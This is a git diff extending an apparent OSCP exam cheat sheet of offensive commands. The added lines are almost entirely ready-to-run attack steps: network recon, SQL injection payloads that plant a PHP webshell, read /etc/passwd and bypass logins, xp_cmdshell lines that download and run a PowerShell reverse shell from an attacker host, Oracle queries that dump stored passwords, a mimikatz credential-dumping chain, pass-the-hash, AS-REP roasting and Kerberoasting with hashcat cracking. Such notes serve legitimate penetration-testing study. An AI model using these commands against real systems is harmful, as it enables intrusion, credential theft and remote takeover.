@@ -1,4 +1,35 @@
 # OSCP Tricks
+## Recon Active
+### Host Discovery
+-> nmap
+```
+nmap -sn 10.10.0.0./16
+```
+https://github.com/andrew-d/static-binaries/tree/master/binaries  
+-> crackmapexec  
+```
+crackmapexec smb 192.168.0.20/24
+```
+
+### Capturing Information
+-> nmap  
+```
+nmap -sC -sV -A -Pn -T5 -p- <ip>
+```
+
+-> rustscan
+```
+rustscan -a <ip> -- -A -Pn
+```
+
+-> enum4linux  
+```
+enum4linux <ip>
+```
+```
+enum4linux -a -u "" -p "" <ip> && enum4linux -a -u "guest" -p "" <ip>
+```
+
 ## Privilege Escalation Linux
 ### Crontab
 #### Enumeration  
@@ -92,6 +123,54 @@ impacket-mssqlclient <user>@<ip> -db <database>
 xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<ip>/Invoke-PowerShellTcp.ps1\")
 ```
 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+### Webshell via SQLI - MySQL
+```
+LOAD_FILE('/etc/httpd/conf/httpd.conf')    
+select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
+```
+ 
+### Reading Files via SQLI - MySQL
+e.g  
+```
+SELECT LOAD_FILE('/etc/passwd')
+```
+
+#### MSSQL Injection
+
+-> Bypass Authentication
+```
+' or 1=1--
+```
+
+-> Enable xp_cmdshell
+```
+' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+```
+
+-> RCE
+```
+' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<ip>/InvokePowerShellTcp.ps1')" ;--
+```
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+
+### Oracle SQL
+
+-> Bypass Authentication
+```
+' or 1=1--
+```
+
+-> Exploiting
+```
+' order by 3--
+' union select null,table_name,null from all_tables--
+' union select null,column_name,null from all_tab_columns where table_name='WEB_USERS'--
+' union select null,column_name,null from all_tab_columns where table_name='WEB_ADMINS'--
+' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
+' union select null,PASSWORD,null from WEB_ADMINS--
+```
 
 ## Client-Side Attacks
 ### HTA Attack in Action
@@ -223,6 +302,10 @@ https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1
 ```
 ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
+-> Mix  
+```
+./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
+```
 ### Extracting hash
 ```
 reg save hklm\sam sam
@@ -269,18 +352,35 @@ https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-P
 -> crackmapexec
 ```
 crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> --continue-on-success
+crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> 
+crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> --local-auth --lsa  
+crackmapexec smb 192.168.0.10-20 -u administrator -p <password>
 ```
-or  
+
+### AS-REP Roasting Attack - not require Pre-Authentication
+-> kerbrute - Enumeration Users
 ```
-crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> --local-auth --lsa   
+kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
+```
+https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+
+-> GetNPUsers.py - Query ASReproastable accounts from the KDC
+```
+impacket-GetNPUsers domain.local/ -dc-ip <ip> -usersfile userlist.txt
 ```
 
 ### Kerberoast
+-> impacket-GetUserSPNs
 ```
-impacket-GetUserSPNs offsec.local/nathan:abc123// -dc-ip 192.168.135.57 -request
+impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <ip> -request
 ```
+or  
 ```
-hashcat -a 0 -m 13100 alisson.txt /usr/share/wordlists/rockyou.txt 
+impacket-GetUserSPNs -request -dc-ip <ip> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
+```
+
+```
+hashcat -a 0 -m 13100 ok.txt /usr/share/wordlists/rockyou.txt 
 ```
 ```
 .\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
